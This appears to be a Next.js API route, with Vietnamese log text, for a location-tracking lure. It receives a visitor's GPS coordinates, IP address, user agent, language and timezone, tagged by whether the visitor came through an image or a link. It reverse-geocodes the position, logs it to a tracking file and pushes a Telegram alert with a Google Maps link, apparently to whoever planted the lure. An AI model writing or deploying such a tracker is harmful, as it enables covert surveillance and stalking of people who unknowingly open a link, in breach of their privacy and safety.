
import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';
import { headers } from 'next/headers';
import { getAddress, sendTelegramNotification } from '@/lib/server-utils';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { lat, lon, acc, ip, from, language, timezone } = body;

    const headersList = headers();
    const ua = headersList.get('user-agent') ?? 'unknown';
    
    const clientIp = ip || headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || 'N/A';
    
    const finalIp = clientIp.startsWith('::ffff:') ? clientIp.substring(7) : clientIp;

    const timestamp = new Date().toISOString();
    const sourceText = from === 'image' ? 'Ảnh' : 'Link';
    
    let logData = `--- [${timestamp}] MỚI TRUY CẬP ---\n`;
    logData += `Nguồn: ${from || 'link'}\n`;
    logData += `Thiết bị: ${ua}\n`;
    logData += `Địa chỉ IP: ${finalIp}\n`;
    logData += `Ngôn ngữ: ${language || 'N/A'}\n`;
    logData += `Múi giờ: ${timezone || 'N/A'}\n`;

    let telegramMessage = `*🔔 Truy cập mới (${sourceText})!*\n\n`;
    telegramMessage += `*Thời gian:* \`${new Date(timestamp).toLocaleString('vi-VN')}\`\n`;
    telegramMessage += `*Thiết bị:* \`${ua}\`\n`;
    telegramMessage += `*Địa chỉ IP:* \`${finalIp}\`\n`;
    telegramMessage += `*Ngôn ngữ:* \`${language || 'N/A'}\`\n`;
    telegramMessage += `*Múi giờ:* \`${timezone || 'N/A'}\`\n`;

    if (lat !== undefined && lon !== undefined) {
      const address = await getAddress(lat, lon);
      const maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
      
      logData += `Tọa độ: ${lat}, ${lon}\n`;
      logData += `Độ chính xác: ${acc || 'N/A'}m\n`;
      logData += `Địa chỉ: ${address}\n`;
      logData += `Link Google Maps: ${maps_link}\n`;

      telegramMessage += `*Vị trí:* ${address}\n`;
      telegramMessage += `*Tọa độ:* \`${lat}, ${lon}\`\n`;
      telegramMessage += `*Độ chính xác:* \`${acc || 'N/A'}m\`\n`;
      telegramMessage += `*Bản đồ:* [Mở Google Maps](${maps_link})\n`;
    }
    
    logData += `----------------------------------\n`;

    const logDir = path.join(process.cwd(), 'logs');
    const logFile = path.join(logDir, 'tracking_logs.txt');
    
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }

    fs.appendFileSync(logFile, logData, 'utf-8');
    
    // Send notification without blocking
    sendTelegramNotification(telegramMessage);
    
    return NextResponse.json({ status: 'ok' });
  } catch (error) {
    console.error('Failed to log location:', error);
    const errorMessage = error instanceof Error ? error.message : 'An unknown error occurred';
    return NextResponse.json({ error: 'Failed to process request', details: errorMessage }, { status: 500 });
  }
}
